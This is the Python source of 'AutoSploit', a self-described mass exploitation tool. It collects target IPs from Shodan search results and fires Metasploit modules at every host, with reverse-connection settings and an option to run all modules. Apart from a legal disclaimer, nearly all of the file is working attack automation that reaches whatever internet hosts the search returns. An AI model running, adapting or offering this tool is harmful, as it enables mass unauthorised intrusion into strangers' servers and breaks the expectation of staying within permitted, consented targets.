#!/usr/bin/env python2.7

import os
import sys
import pickle
import time

from subprocess import PIPE, Popen

import shodan
from blessings import Terminal

t = Terminal()

# Global vars
api = ""
query = ""
workspace = ""
local_port = ""
local_host = ""
configured = False
toolbar_width = 60


# Logo
def logo():
    print t.cyan("""
                              _____     _       _____     _     _ _   
#--Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_ 
#--Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|
#--Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|  
#--Version: 1.0.0                                    |_|             
##############################################
""")


# Usage and legal.
def usage():
    os.system("clear")
    logo()
    print """
+-----------------------------------------------------------------------+
|            AutoSploit General Usage and Information                   |
+-----------------------------------------------------------------------+
|As the name suggests AutoSploit attempts to automate the exploitation  |
|of remote hosts. Targets are collected by employing the Shodan.io API. |
|                                                                       |
|The 'Gather Hosts' option will open a dialog from which you can        |
|enter platform specific search queries such as 'Apache' or 'IIS'.      |
|Upon doing so a list of candidates will be retrieved and saved to      |
|hosts.txt in the current working directory.                            |
|After this operation has been completed the 'Exploit' option will      |
|go about the business of attempting to exploit these targets by        |
|running a range of Metasploit modules against them.                    |
|                                                                       |
|Workspace, local host and local port for MSF facilitated               |
|back connections are configured through the dialog that comes up       |
|before the 'Exploit' module is started.                                |
|                                                                       |
+------------------+----------------------------------------------------+
|     Option       |                   Summary                          |
+------------------+----------------------------------------------------+
|1. Usage          | Display this informational message.                |
|2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  |
|3. View Hosts     | Print gathered IPs/RHOSTS.                         |
|4. Exploit        | Configure MSF and Start exploiting gathered targets|
|5. Quit           | Exits AutoSploit.                                  |
+------------------+----------------------------------------------------+
|                         Legal Disclaimer                              |
+-----------------------------------------------------------------------+
| Usage of AutoSploit for attacking targets without prior mutual consent| 
| is illegal. It is the end user's responsibility to obey all applicable| 
| local, state and federal laws. Developers assume no liability and are |
| not responsible for any misuse or damage caused by this program!	|
+-----------------------------------------------------------------------+
"""


# Function that allows us to store system command
# output in a variable
def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]


def exploit(query):
    global workspace
    global local_port
    global local_host

    os.system("clear")
    logo()

    sorted_modules = []
    all_modules = []

    print "[" + t.green("+") + "]Sorting modules relevant to the specified platform."
    print "[" + t.green("+") + "]This may take a while...\n\n\n"

    # Progress bar
    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))

    with open("modules.txt", "rb") as infile:
        for i in xrange(toolbar_width):
            time.sleep(0.1)
            for lines in infile:
                all_modules.append(lines)
                if query in lines:
                    sorted_modules.append(lines)

            # update the bar
            sys.stdout.write('\033[94m' + "|" + '\033[0m')
            sys.stdout.flush()

    print "\n\n\n[" + t.green("+") + "]AutoSploit sorted the following MSF modules based search query relevance.\n"
    # Print out the sorted modules
    for line in sorted_modules:
        print "[" + t.cyan("-") + "]" + line

    # We'll give the user the option to run all modules in a 'hail mary' type of attack or allow
    # a more directed approach with the sorted modules.
    choice = raw_input("\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()

    if choice == 's':
        with open("hosts.txt", "rb") as host_list:
            for rhosts in host_list:
                for exploit in sorted_modules:
                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
                    workspace, local_host, local_port, rhosts, exploit)
                    os.system(template)
    elif choice == 'a':
        with open("hosts.txt", "rb") as host_list:
            for rhosts in host_list:
                for exploit in all_modules:
                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
                    workspace, local_host, local_port, rhosts, exploit)
                    os.system(template)
    else:
        print "[" + t.red("!") + "]Unhandled Option. Defaulting to Main Menu"


# Function to gather target hosts from Shodan 
def targets(clobber=True):
    global query

    os.system("clear")
    logo()

    print "[" + t.green("+") + "]Please provide your platform specific search query."
    print "[" + t.green("+") + "]I.E. 'IIS' will return a list of IPs belonging to IIS servers."

    while True:
        query = raw_input("\n<" + t.cyan("PLATFORM") + ">$ ")

        if query == "":
            print "[" + t.red("!") + "]Query cannot be null."
        else:
            break

    print "[" + t.green("+") + "]Please stand by while results are being collected...\n\n\n"
    time.sleep(1)

    try:
        result = api.search(query)
    except Exception as e:
        print "\n[" + t.red("!") + "]Critical. An error was raised with the following error message.\n"
        print e

        sys.exit(0)

    # Setup progress bar
    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))

    if clobber == True:
        with open('hosts.txt', 'wb') as log:
            for i in xrange(toolbar_width):
                time.sleep(0.1)
                for service in result['matches']:
                    log.write(service['ip_str'])
                    log.write("\n")

                # update the bar
                sys.stdout.write('\033[94m' + "|" + '\033[0m')
                sys.stdout.flush()

        hostpath = os.path.abspath("hosts.txt")

        print "\n\n\n[" + t.green("+") + "]Done."
        print "[" + t.green("+") + "]Host list saved to " + hostpath

    else:
        with open("hosts.txt", "ab") as log:
            for i in xrange(toolbar_width):
                time.sleep(0.1)
                for service in result['matches']:
                    log.write(service['ip_str'])
                    log.write("\n")

        # update the bar
        sys.stdout.write('\033[94m' + "|" + '\033[0m')
        sys.stdout.flush()

        hostpath = os.path.abspath("hosts.txt")

        print "\n\n\n[" + t.green("+") + "]Done."
        print "[" + t.green("+") + "]Hosts appended to list at " + hostpath


# Function to define metasploit settings
def settings():
    global workspace
    global local_port
    global local_host
    global configured

    os.system("clear")
    logo()

    print "[" + t.green("+") + "]MSF Settings\n"
    print "In order to proceed with the exploit module some MSF"
    print "settings need to be configured."
    time.sleep(1.5)

    print "\n[" + t.green("+") + "]Note.\n"
    print "Please make sure your Network is configured properly.\n"
    print "In order to handle incoming Reverse Connections"
    print "your external Facing IP & Port need to be reachable..."
    time.sleep(1.5)

    workspace = raw_input("\n[" + t.magenta("?") + "]Please set the Workspace name: ")
    if not workspace == "":
        print "[" + t.green("+") + "]Workspace set to: " + workspace
    else:
        workspace = False

    local_host = raw_input("\n[" + t.magenta("?") + "]Please set the local host: ")
    if not local_host == "":
        print "[" + t.green("+") + "]Local host set to: " + repr(local_host)
    else:
        local_host = False

    local_port = raw_input("\n[" + t.magenta("?") + "]Please set the local port: ")
    if not local_host == "":
        print "[" + t.green("+") + "]Local port set to: " + repr(local_port)
    else:
        local_port = False

    # Check if settings are not null
    if workspace == False or local_host == False or local_port == False:
        configured = None
        print "\n[" + t.red("!") + "]Warning. LPORT, LHOST and/or workspace cannot be null"
        print "[" + t.green("+") + "]Restarting MSF Settings module."
        time.sleep(1.5)
    else:
        # If everything has been properly configured we're setting config var to true
        # When we return to the main menu loop we will use it to check to see if we
        # can skip the config stage. When the exploit component is run a second time
        configured = True

        if not os.path.isfile("hosts.txt"):
            print "[" + t.red("!") + "]Warning. AutoSploit failed to detect host file."
            print "In order for the exploit module to work, a host file needs to be"
            print "present."
        else:
            # Call exploit function, the 'query' argument contains the search strig provided
            # in the 'gather hosts' function. We will check this string against the MSF
            # modules in order to sort out the most relevant ones with regards to the intended
            # targets.
            exploit(query)


# Main menu
def main():
    global query
    global configured
    global api

    try:
        api = shodan.Shodan(SHODAN_API_KEY)
    except Exception as e:
        print "\n[" + t.red("!") + "]Critical. API setup failed.\n"
        print e
        sys.exit(0)

    try:
        while True:
            # Make sure a misconfiguration in the MSF settings
            # Doesn't execute main menu loop but returns us to the
            # appropriate function for handling those settings
            if configured == None:
                settings()

            print "\n[" + t.green("+") + "]Welcome to AutoSploit. Please select an action."
            print """
		
1. Usage		3. View Hosts		5. Quit
2. Gather Hosts		4. Exploit 					
									"""

            action = raw_input("\n<" + t.cyan("AUTOSPLOIT") + ">$ ")

            if action == '1':
                usage()

            elif action == '2':
                if not os.path.isfile("hosts.txt"):
                    targets(True)
                else:
                    append = raw_input("\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()

                    if append == 'a':
                        targets(False)
                    elif append == 'o':
                        targets(True)
                    else:
                        print "\n[" + t.red("!") + "]Unhandled Option."

            elif action == '3':
                if not os.path.isfile("hosts.txt"):
                    print "\n[" + t.red("!") + "]Warning. AutoSploit failed to detect host file."

                else:
                    print "[" + t.green("+") + "]Printing hosts...\n\n"
                    time.sleep(2)

                    with open("hosts.txt", "rb") as infile:
                        for line in infile:
                            print "[" + t.cyan("-") + "]" + line

                    print "[" + t.green("+") + "]Done.\n"

            elif action == '4':
                if not os.path.isfile("hosts.txt"):
                    print "\n[" + t.red("!") + "]Warning. AutoSploit failed to detect host file."
                    print "Please make sure to gather a list of targets"
                    print "by selecting the 'Gather Hosts' option"
                    print "before executing the 'Exploit' module."

                if configured == True:
                    exploit(query)
                elif configured == False:
                    settings()

            elif action == '5':
                print "\n[" + t.red("!") + "]Exiting AutoSploit..."
                break

            else:
                print "\n[" + t.red("!") + "]Unhandled Option."

    except KeyboardInterrupt:
        print "\n[" + t.red("!") + "]Critical. User aborted."
        sys.exit(0)


if __name__ == "__main__":
    logo()

    print "[" + t.green("+") + "]Initializing AutoSploit..."
    print "[" + t.green("+") + "]One moment please while we check the Postgresql and Apache services...\n"

    postgresql = cmdline("sudo service postgresql status | grep active")
    if "Active: inactive" in postgresql:
        print "\n[" + t.red("!") + "]Warning. Heuristics indicate Postgresql Service is offline"

        start_pst = raw_input("\n[" + t.magenta("?") + "]Start Postgresql Service? [Y]es/[N]o: ").lower()
        if start_pst == 'y':
            os.system("sudo service postgresql start")

            print "[" + t.green("+") + "]Postgresql Service Started..."
            time.sleep(1.5)

        elif start_pst == 'n':
            print "\n[" + t.red("!") + "]AutoSploit's MSF related operations require this service to be active."
            print "[" + t.red("!") + "]Aborted."
            time.sleep(1.5)
            sys.exit(0)
        else:
            print "\n[" + t.red("!") + "]Unhandled Option. Defaulting to starting the service."
            os.system("sudo service postgresql start")

            print "[" + t.green("+") + "]Postgresql Service Started..."
            time.sleep(1.5)

    apache = cmdline("service apache2 status | grep active")
    if "Active: inactive" in apache:
        print "\n[" + t.red("!") + "]Warning. Heuristics indicate Apache Service is offline"

        start_ap = raw_input("\n[" + t.magenta("?") + "]Start Apache Service? [Y]es/[N]o: ").lower()
        if start_ap == 'y':
            os.system("sudo service apache2 start")

            print "[" + t.green("+") + "]Apache2 Service Started..."
            time.sleep(1.5)

        elif start_ap == 'n':
            print "\n[" + t.red("!") + "]AutoSploit's MSF related operations require this service to be active."
            print "[" + t.red("!") + "]Aborted."
            time.sleep(1.5)
            sys.exit(0)
        else:
            print "\n[" + t.red("!") + "]Unhandled Option. Defaulting to starting the service."
            os.system("sudo service apache2 start")

            print "[" + t.green("+") + "]Apache2 Service Started..."
            time.sleep(1.5)

    # We will check if the shodan api key has been saved before, if not we are going to prompt
    # for it and save it to a file
    if not os.path.isfile("api.p"):
        print "\n[" + t.green("+") + "]Please provide your Shodan.io API key."

        SHODAN_API_KEY = raw_input("API key: ")
        pickle.dump(SHODAN_API_KEY, open("api.p", "wb"))

        path = os.path.abspath("api.p")
        print "[" + t.green("+") + "]\nYour API key has been saved to " + path

        main()
    else:
        try:
            SHODAN_API_KEY = pickle.load(open("api.p", "rb"))
        except IOError as e:
            print "\n[" + t.red("!") + "]Critical. An IO error was raised while attempting to read API data."
            print e

        path = os.path.abspath("api.p")
        print "\n[" + t.green("+") + "]Your API key was loaded from " + path

        main()
